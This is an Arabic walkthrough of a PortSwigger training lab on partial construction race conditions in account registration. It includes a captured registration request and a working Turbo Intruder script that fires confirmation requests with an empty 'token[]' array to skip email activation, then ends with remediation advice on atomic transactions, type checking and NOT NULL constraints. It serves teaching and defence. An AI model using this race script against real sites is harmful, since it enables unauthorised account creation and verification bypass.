# [Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

## **`الهدف`**
قم بإنشاء حساب ببريد إلكتروني `@ginandjuice.shop` وتخطى خطوة التفعيل وقم بتسجيل الدخول بنجاح ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
إذا قمنا بتجربة لإنشاء حساب بإسم `test`، وكذلك تسجيل الدخول بنفس هذا الحساب وقمنا بإرسال كلا الطلبين في `Repeater` سنلاحظ أن طلب تسجيل الدخول يتم معالجته أسرع من طلب إنشاء الحساب.

لذلك سنقوم بتحويل طلب إنشاء الحساب إلى `Turbo Intruder` ونقوم بتغيير الـ `Username` إلى `%s`.
```http
POST /register HTTP/2
Host: 0af1001b03237be58089a0d600ee002c.web-security-academy.net
Cookie: phpsessionid=Hcrx8ojDnheK4yUYpbjlDyVf7GMkXfTY

csrf=r9P5mBtATHXNqGWjKdGX7QJwnBuC6wUb&username=%s&email=%s%40ginandjuice.shop&password=123456
```

ثم سنستعمل هذا سكريبت بايثون التالي:

```Python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION-TOKEN
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

وسنبحث في الطلبات بإستجابة `200` حتى نجد أحد الحسابات يعرض رسالة
Account registration for user (Random User) is successful!
فسنتوجه إلى اللاب ونقوم بتسجيل الدخول بهذا الحساب وبكلمة المرور التي قمنا بوضعها في الطلب الذي استعملناه في `Turbo Intruder` ثم نتوجه للوحة التحكم ونقوم بحذف حساب `carlos`.
## **`ترقيع الثغرة`**
يجب التأكد من أن عملية إنشاء رمز التأكيد `Token` وبيانات المستخدم تتم ككتلة واحدة في الذاكرة باستخدام متغيرات محلية `Local Variables` مستقلة لكل مسار تنفيذ `Thread` أو طلب `Request`، قبل إجراء أي إدخال `Insert` في قاعدة البيانات، لأن ذلك يعالج السبب الجذري للثغرة مباشرةً ويمنع استغلال التداخل بين الطلبات المتزامنة وتخريب حالة البيانات `State Corruption` ووجود سجل مستخدم برمز تأكيد فارغ `Null` في قاعدة البيانات.

ويجب استخدام المعاملات الذرية `Atomic Transactions` على مستوى قاعدة البيانات، بحيث يتم تنفيذ عملية إنشاء الحساب وإضافة رمز التأكيد `Token` داخل معاملة `Transaction` واحدة، لأن هذا الأسلوب يجبر قاعدة البيانات على عدم حفظ أي سجلات غير مكتملة `Partial Construction` حتى انتهاء جميع الخطوات بنجاح، فيمنع أي طلب متزامن آخر أو طلب تأكيد من قراءة السجل قبل أن يكتمل الطلب الأول، وبذلك يُسد الفجوة الزمنية `Race Window` المستغلة في الثغرة.

ويجب فرض آلية تحقق صارمة من نوع المدخلات `Strict Type Checking` على مستوى التطبيق `Application-level`، بحيث يتم التحقق برمجياً لضمان أن المُدخل `token` المُرسل في الطلب هو نص `String` وليس مصفوفة `Array`، مع استخدام معامل التطابق الصارم `===` عند المقارنة، وبهذه الطريقة يرفض النظام تلقائياً أي محاولة لتخطي التحقق عبر التلاعب بأنواع البيانات `Type Juggling`، فتفشل الطلبات الخبيثة التي تستغل الحقول الفارغة بشكل قاطع.

ويجب تطبيق آلية الربط القوي للبيانات `Data Binding` وإدارة الحالة `State Management` لتتبع حالة الحساب الجديد، عن طريق ربط رمز التأكيد `Token` داخل قاعدة البيانات بحالة حساب افتراضية غير نشطة `Pending`، والأهم أن يتم تنفيذ عملية التفعيل نفسها بشرط التحقق المسبق من أن رمز التأكيد الموجود في قاعدة البيانات غير فارغ `Not Empty`، بحيث لو تم إرسال طلب تفعيل متزامن قبل اكتمال إنشاء الرمز في قاعدة البيانات، تفشل عملية التأكيد تلقائياً ولا يُسمح بتسجيل الدخول `Login` لحساب غير مكتمل البناء بناءً على تداخل المعطيات.

ويجب فرض قيود هيكلية `Structural Constraints` صارمة على مستوى مخطط قاعدة البيانات `Database Schema`، بحيث يتم إعداد حقل رمز التأكيد `Token` ليكون حقلاً إلزامياً لا يقبل القيمة الفارغة `NOT NULL` ولا يحتوي على قيمة افتراضية `No Default Value`، لأن هذا الأسلوب يعمل كخط دفاع أخير `Fail-safe Mechanism` يرفض على مستوى محرك قاعدة البيانات `Database Engine` أي أمر إدخال `Insert` لبيانات المستخدم دون توفير الرمز في نفس اللحظة، مما يؤدي إلى إطلاق استثناء برمجي `SQL Exception` بدلاً من إنشاء سجل مبتور، وبذلك يتم القضاء جذرياً على أي احتمالية لحدوث ثغرة البناء الجزئي `Partial Construction` حتى في حال وجود قصور في التغليف المنطقي للكود.
